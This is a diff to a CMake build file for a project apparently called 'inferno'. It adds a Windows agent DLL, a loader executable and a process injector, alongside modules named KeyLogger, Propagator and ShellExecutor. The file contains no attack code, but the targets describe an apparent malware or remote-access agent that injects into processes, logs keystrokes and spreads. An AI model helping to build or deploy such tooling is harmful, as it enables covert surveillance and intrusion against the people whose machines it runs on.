@@ -90,8 +90,12 @@ add_executable(inferno_client
     client/src/Propagator.cpp
     client/src/entry_dylib.cpp
     client/src/EntitlementScanner.cpp
-    client/src/MachInjector.cpp
 )
+if(WIN32)
+    target_sources(inferno_client PRIVATE client/src/WindowsInjector.cpp)
+else()
+    target_sources(inferno_client PRIVATE client/src/MachInjector.cpp)
+endif()
 target_link_libraries(inferno_client PRIVATE inferno_common)
 
 if(APPLE)
@@ -139,6 +143,32 @@ if(APPLE)
 endif()
 
 # ==========================================
+# 5b. Agent DLL (Phase 4B — Windows Injection)
+# ==========================================
+if(WIN32)
+    add_library(inferno_agent_dll SHARED
+        client/src/entry_dll.cpp
+        client/src/Agent.cpp
+        client/src/ProcessProfiler.cpp
+        client/src/ShellExecutor.cpp
+        client/src/KeyLogger.cpp
+        client/src/Propagator.cpp
+        client/src/EntitlementScanner.cpp
+        client/src/WindowsInjector.cpp
+    )
+    target_include_directories(inferno_agent_dll PRIVATE client/include)
+    target_compile_definitions(inferno_agent_dll PRIVATE INFERNO_DLL)
+    target_compile_definitions(inferno_agent_dll PRIVATE _CRT_SECURE_NO_WARNINGS)
+    target_link_libraries(inferno_agent_dll PRIVATE inferno_common ws2_32)
+    set_target_properties(inferno_agent_dll PROPERTIES
+        OUTPUT_NAME "inferno_agent"
+    )
+
+    add_executable(inferno_loader client/src/windows_loader.cpp)
+    target_compile_definitions(inferno_loader PRIVATE _CRT_SECURE_NO_WARNINGS)
+endif()
+
+# ==========================================
 # 6. TDD Infrastructure
 # ==========================================
 enable_testing()
@@ -163,10 +193,14 @@ add_executable(inferno_tests
     client/src/ShellExecutor.cpp
     client/src/KeyLogger.cpp
     client/src/Propagator.cpp
-    client/src/MachInjector.cpp
     client/src/EntitlementScanner.cpp
     tests/inject_e2e_test.cpp
 )
+if(WIN32)
+    target_sources(inferno_tests PRIVATE client/src/WindowsInjector.cpp)
+else()
+    target_sources(inferno_tests PRIVATE client/src/MachInjector.cpp)
+endif()
 target_include_directories(inferno_tests PRIVATE client/include)
 target_link_libraries(inferno_tests PRIVATE inferno_common Qt6::Widgets Qt6::Gui Qt6::Core Qt6::Sql)
 target_compile_definitions(inferno_tests PRIVATE INFERNO_TESTING)
@@ -184,7 +218,15 @@ endif()
 
 if(WIN32)
     target_compile_definitions(inferno_tests PRIVATE _CRT_SECURE_NO_WARNINGS)
+    target_compile_definitions(inferno_tests PRIVATE
+        TEST_BINARY_DIR="$<TARGET_FILE_DIR:inferno_agent_dll>"
+    )
     target_link_libraries(inferno_tests PRIVATE ws2_32 advapi32 user32)
+    target_sources(inferno_tests PRIVATE
+        client/src/entry_dll.cpp
+        tests/windows_dll_test.cpp
+    )
+    add_dependencies(inferno_tests inferno_agent_dll inferno_loader)
 endif()
 
 add_test(NAME CoreNetworkingTests COMMAND inferno_tests)
